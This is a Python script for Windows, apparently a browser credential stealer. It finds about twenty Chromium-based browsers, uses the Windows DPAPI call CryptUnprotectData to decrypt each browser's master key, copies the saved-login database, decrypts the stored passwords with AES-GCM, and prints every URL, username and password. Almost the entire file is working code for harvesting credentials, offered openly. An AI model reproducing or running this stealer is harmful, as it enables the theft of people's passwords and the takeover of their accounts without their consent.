
# created by Noah Pearson (6e6f6168 aka vanillablunt)

import base64
import json
import os
import random
import shutil
import sqlite3
import string
import tempfile
import traceback
import time
from Crypto.Cipher import AES

from ctypes import c_buffer, Structure, POINTER, c_char, WinDLL, byref, c_void_p, create_string_buffer, memmove, sizeof
from ctypes.wintypes import DWORD, BOOL, LPWSTR, HWND, LPCWSTR, LPVOID

date = time.strftime("%d%m%Y_%H%M%S")
tmp = tempfile.gettempdir()

class datablob(Structure):
    _fields_ = [
        ('cbData', DWORD),
        ('pbData', POINTER(c_char))
    ]

class promptstruct(Structure):
    _fields_ = [
        ('cbSize', DWORD),
        ('dwPromptFlags', DWORD),
        ('hwndApp', HWND),
        ('szPrompt', LPCWSTR),
    ]

kernel32 = WinDLL('kernel32', use_last_error=True)
localf = kernel32.LocalFree
localf.restype = LPVOID
localf.argtypes = [LPVOID]

crypt32 = WinDLL('crypt32', use_last_error=True)
crypt = crypt32.CryptUnprotectData
crypt.restype = BOOL
crypt.argtypes = [POINTER(datablob), POINTER(LPWSTR), POINTER(datablob), c_void_p, POINTER(promptstruct), DWORD, POINTER(datablob)]

def DecryptData(data):
    bufferIn = c_buffer(data,len(data))
    blobIn = datablob(len(data),bufferIn)
    blobOut = datablob()
    crypt(byref(blobIn),None,None,None,None,0,byref(blobOut))
    cbData = blobOut.cbData
    pbData = blobOut.pbData
    buffer = create_string_buffer(cbData)
    memmove(buffer, pbData, sizeof(buffer))
    localf(pbData)
    password = buffer.raw
    return password


chromium_browsers = [
    (u'7Star', u'{LOCALAPPDATA}\\7Star\\7Star\\User Data'),
    (u'amigo', u'{LOCALAPPDATA}\\Amigo\\User Data'),
    (u'brave', u'{LOCALAPPDATA}\\BraveSoftware\\Brave-Browser\\User Data'),
    (u'centbrowser', u'{LOCALAPPDATA}\\CentBrowser\\User Data'),
    (u'chedot', u'{LOCALAPPDATA}\\Chedot\\User Data'),
    (u'chrome canary', u'{LOCALAPPDATA}\\Google\\Chrome SxS\\User Data'),
    (u'chromium', u'{LOCALAPPDATA}\\Chromium\\User Data'),
    (u'chromium edge', u'{LOCALAPPDATA}\\Microsoft\\Edge\\User Data'),
    (u'coccoc', u'{LOCALAPPDATA}\\CocCoc\\Browser\\User Data'),
    (u'elements browser', u'{LOCALAPPDATA}\\Elements Browser\\User Data'),
    (u'epic privacy browser', u'{LOCALAPPDATA}\\Epic Privacy Browser\\User Data'),
    (u'google chrome', u'{LOCALAPPDATA}\\Google\\Chrome\\User Data'),
    (u'kometa', u'{LOCALAPPDATA}\\Kometa\\User Data'),
    (u'opera', u'{APPDATA}\\Opera Software\\Opera Stable'),
    (u'orbitum', u'{LOCALAPPDATA}\\Orbitum\\User Data'),
    (u'sputnik', u'{LOCALAPPDATA}\\Sputnik\\Sputnik\\User Data'),
    (u'torch', u'{LOCALAPPDATA}\\Torch\\User Data'),
    (u'uran', u'{LOCALAPPDATA}\\uCozMedia\\Uran\\User Data'),
    (u'vivaldi', u'{LOCALAPPDATA}\\Vivaldi\\User Data')
]

existing_browsers = []
exploitable_browsers = []

logins = []

for browser in chromium_browsers:
    browser_location = browser[1]
    browser_location = browser_location.replace("{LOCALAPPDATA}",os.getenv("localappdata"))
    browser_location = browser_location.replace("{APPDATA}",os.getenv("appdata"))
    if os.path.exists(browser_location):
        existing_browsers.append(browser_location)

for browser_location in existing_browsers:
    if os.path.exists(browser_location+"\\Local State") and os.path.exists(browser_location + "\\Default\\Login Data"):
        exploitable_browsers.append(browser_location)

for browser_location in exploitable_browsers:
    local_state_path = browser_location + "\\Local State"
    login_data_path = browser_location + "\\Default\\Login Data"
    with open(local_state_path) as f:
        try:
            data = json.load(f)
            profiles |= set(data['profile']['info_cache'])
        except Exception:
            pass
    with open(local_state_path) as local_state_file:
        key = base64.b64decode(json.load(local_state_file)["os_crypt"]["encrypted_key"])
        key = key[5:]
        key = DecryptData(key)
        copied_database = str(os.getenv('temp')+"\\bigmeme")
        shutil.copyfile(login_data_path,copied_database)
        conn = sqlite3.connect(copied_database)
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for url, username, password in cursor.fetchall():
            if password:
                if password[:3] == b'v10':
                    cipher = AES.new(key, AES.MODE_GCM, password[3:15])
                    password = cipher.decrypt(password[15:])
                    password = password[:-16].decode()  # remove suffix bytes
                    logins.append((url,username,password))
        conn.close()
        os.remove(copied_database)

for login in logins:
    if login[0] and login[1] and login[2]:
        print("URL: "+login[0])
        print("Username: "+login[1])
        print("Password: "+login[2])
        print("")
